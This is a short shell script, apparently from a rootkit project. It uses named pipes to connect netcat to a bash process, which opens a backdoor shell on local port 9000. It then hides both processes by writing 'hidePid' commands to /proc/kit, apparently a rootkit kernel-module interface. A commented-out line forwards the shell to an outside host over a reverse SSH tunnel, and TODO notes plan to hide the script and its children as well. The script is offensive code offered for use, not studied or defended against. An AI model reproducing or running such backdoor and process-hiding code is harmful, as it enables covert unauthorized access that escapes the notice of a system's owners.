#!/bin/sh

#TODO: hide this script

#hide this process
localPort=9000

#assumes module is install first e,g, if a command is run from shell it needs to be hidden.

#TODO: hide child processe

mkfifo fromBash
mkfifo toBash


nc localhost "$localPort" < fromBash >> toBash &
backgroundPID=$!
echo "hidePid $backgroundPID" > /proc/kit

bash >> fromBash  2>>fromBash < toBash & # uses named pipe
backgroundPID=$!
echo "hidePid $backgroundPID" > /proc/kit


#rm fromBash
#rm toBash

#given this direcory is removed removing the individual files does not need to be done

#ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 

#TODO GET OUTPUT





